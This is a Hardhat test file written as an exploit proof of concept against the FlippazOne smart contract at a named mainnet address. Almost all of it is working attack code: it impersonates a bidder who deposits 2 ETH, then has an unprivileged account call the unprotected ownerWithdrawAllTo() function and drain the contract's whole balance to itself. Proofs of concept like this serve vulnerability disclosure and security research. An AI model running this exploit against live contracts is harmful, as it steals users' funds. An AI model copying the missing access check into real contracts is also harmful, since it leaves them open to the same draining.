const { expect, assert } = require("chai");
const { ethers } = require("hardhat");
const {expectRevert} = require("@openzeppelin/test-helpers");

describe("FlippazOne Missing Access Control Exploit PoC", function () {
    this.timeout("250000");
    let target;
    let accounts;
    before(async () => {
      target = await hre.ethers.getVerifiedContractAt("0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944");
      accounts = await ethers.getSigners();
    });

    it("Read the correct address", async function () {   
        console.log("the contract address at block 15083765 is: " + target.address);
    });

    it("Call the ownerWithdrawAllTo() function and drain funds", async function(){
        
        const attackerAddress = accounts[0].address;
        const bidderAddress = accounts[1].address;

        console.log("Bidder Address : " + bidderAddress);
        console.log("Attacker Address : " + attackerAddress);
        
        console.log("ETH Balance of FlippazOne Contract : " + ethers.utils.formatUnits(await ethers.provider.getBalance(target.address), 18));
        console.log("ETH Balance of Attacker : " + ethers.utils.formatUnits(await ethers.provider.getBalance(attackerAddress), 18));
        console.log("ETH Balance of Bidder : " + ethers.utils.formatUnits(await ethers.provider.getBalance(bidderAddress), 18));

        
        //Impersonate the bidderAddress account and send a bid
        await hre.network.provider.request({
            method: "hardhat_impersonateAccount",
            params: [bidderAddress]}
        );
        const bidderAccountSigner = await ethers.provider.getSigner(bidderAddress);
        
        const bidTx = await target.connect(bidderAccountSigner).bid({ value: ethers.utils.parseEther("2") }); 
        console.log("Transaction initiated from Bidder with Bid of 2 ETH: " + bidTx.from);
        console.log("ETH Balance of FlippazOne Contract : " + ethers.utils.formatUnits(await ethers.provider.getBalance(target.address), 18));
        
        //Impersonate the attacker account and send transaction
        await hre.network.provider.request({
          method: "hardhat_impersonateAccount",
          params: [attackerAddress]}
        );
        const attackerAccountSigner = await ethers.provider.getSigner(attackerAddress);

        const withdrawTx = await target.connect(attackerAccountSigner).ownerWithdrawAllTo(attackerAddress);
        console.log("Transaction initiated from Attacker to ownerWithdrawAllTo() function: " + withdrawTx.from);
        console.log("ETH Balance of FlippazOne Contract : " + ethers.utils.formatUnits(await ethers.provider.getBalance(target.address), 18));
        console.log("ETH Balance of Attacker : " + ethers.utils.formatUnits(await ethers.provider.getBalance(attackerAddress), 18));
        console.log("ETH Balance of Bidder : " + ethers.utils.formatUnits(await ethers.provider.getBalance(bidderAddress), 18));

        expect(await ethers.provider.getBalance(target.address)).to.equal(0);
    });
});